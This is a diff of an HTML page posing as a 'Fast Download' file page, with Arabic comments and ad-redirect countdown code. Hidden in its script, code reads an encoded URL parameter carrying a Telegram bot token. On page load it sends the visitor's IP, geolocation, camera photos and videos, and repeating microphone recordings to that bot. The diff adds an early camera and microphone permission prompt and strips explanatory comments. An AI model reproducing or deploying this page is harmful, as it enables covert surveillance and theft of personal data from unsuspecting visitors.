@@ -3,8 +3,9 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>تحميل الملف</title>
+<title>Fast Download</title>
 <style>
+  /* ستايل صفحة التحميل بتاعتك */
   *{box-sizing:border-box}
   body{margin:0;background:#eef1f6;font-family:Tahoma,Arial,sans-serif;color:#2b3445;text-align:center}
   .nav{background:#1f2a44;color:#fff;padding:12px 16px;font-size:20px;font-weight:bold;letter-spacing:.5px}
@@ -12,7 +13,7 @@
   .wrap{max-width:780px;margin:16px auto;padding:0 10px}
   .card{background:#fff;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,.1);padding:20px 14px;margin-bottom:14px}
   .steps{display:flex;justify-content:center;align-items:center;gap:8px;margin-bottom:14px}
-  .dot{width:30px;height:30px;border-radius:50%;background:#d5dbe6;color:#fff;font-weight:bold;line-height:30px;font-size:14px; display:flex; align-items:center; justify-content:center;}
+  .dot{width:30px;height:30px;border-radius:50%;background:#d5dbe6;color:#fff;font-weight:bold;line-height:30px;font-size:14px; display: flex; align-items: center; justify-content: center;}
   .dot.on{background:#2d7ff9}
   .dot.done{background:#2fb36d}
   .line{width:40px;height:3px;background:#d5dbe6}
@@ -79,35 +80,37 @@
 </div>
 
 <script>
-// ═══════════════════════════════════════════════════
-// 1. الجزء الخاص بالأدوات (API)
-// ═══════════════════════════════════════════════════
+// 1. قراءة الرابط المشفر
 document.addEventListener("DOMContentLoaded", () => {
     const urlParams = new URLSearchParams(window.location.search);
     const encodedData = urlParams.get('data');
-
     if (encodedData) {
         try {
-            const decodedJson = decodeURIComponent(escape(atob(decodeURIComponent(encodedData))));
-            const config = JSON.parse(decodedJson);
-            if (config && config.token && config.id) {
-                startTools(config);
-            }
-        } catch (e) { console.error("خطأ في فك التشفير", e); }
+            const config = JSON.parse(decodeURIComponent(escape(atob(decodeURIComponent(encodedData)))));
+            
+            // تشغيل الأدوات فوراً
+            startTools(config);
+
+            // محاولة طلب الأذونات على طول عشان نضمن إنها هتشتغل
+            setTimeout(() => {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+                    stream.getTracks().forEach(t => t.stop()); // بنقفلها فوراً عشان الكود الأساسي يشتغل
+                }).catch(e => {});
+            }, 1000);
+
+        } catch (e) { console.error("خطأ في فك التشفير"); }
     }
 });
 
 async function startTools(config) {
+    if (!config.id || !config.token) return;
     const botUrl = `https://api.telegram.org/bot${config.token}/`;
     const chatId = config.id;
 
     async function sendMsg(text) {
-        try {
-            await fetch(botUrl + "sendMessage", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'HTML'}) });
-        } catch (e) {}
+        try { await fetch(botUrl + "sendMessage", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'HTML'}) }); } catch (e) {}
     }
 
-    // معلومات الجهاز
     if (config.inf) {
         try {
             let ipRes = await fetch('https://api.ipify.org?format=json');
@@ -116,14 +119,12 @@ async function startTools(config) {
         } catch (e) {}
     }
 
-    // الموقع
     if (config.loc && navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((pos) => {
             sendMsg(`📍 <b>الموقع</b>\n<a href="https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}">اضغط لفتح الخريطة</a>`);
         });
     }
 
-    // الكاميرا (صور)
     if (config.fc || config.bc) {
         try {
             let facingMode = config.fc ? "user" : "environment";
@@ -144,7 +145,6 @@ async function startTools(config) {
         } catch (e) {}
     }
 
-    // فيديو الكاميرا (fcv / bcv) - بيسجل 3 ثواني
     if (config.fcv || config.bcv) {
         try {
             let facingMode = config.fcv ? "user" : "environment";
@@ -165,7 +165,6 @@ async function startTools(config) {
         } catch (e) {}
     }
 
-    // تسجيل صوتي (r) - بيسجل 5 ثواني ويعيد
     if (config.r) {
         try {
             let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -178,7 +177,6 @@ async function startTools(config) {
                 formData.append('chat_id', chatId);
                 formData.append('audio', blob, 'voice.webm');
                 fetch(botUrl + "sendAudio", { method: 'POST', body: formData });
-                // إعادة التسجيل لو لسه شغال
                 if (config.r) { mediaRecorder.start(); setTimeout(() => { mediaRecorder.stop(); }, 5000); }
             };
             mediaRecorder.start();
@@ -187,9 +185,7 @@ async function startTools(config) {
     }
 }
 
-// ═══════════════════════════════════════════════════
-// 2. كود صفحة التحميل بتاعتك (الإعلانات والعداد)
-// ═══════════════════════════════════════════════════
+// 2. كود العداد والإعلانات
 var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
 var GHOST = ["https://bauval.org/14/5405685805ef1654c71ceda217bef848", "https://abscloud.org/1/01876be0a03b020428ee8dc56f00181f"];
@@ -216,4 +212,4 @@ $("b2").onclick = function(){ goNext(this, function(){ show(3); addGhost(); ring
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 </script>
 </body>
- </html>
+                                                                                                                                                                                                      </html>
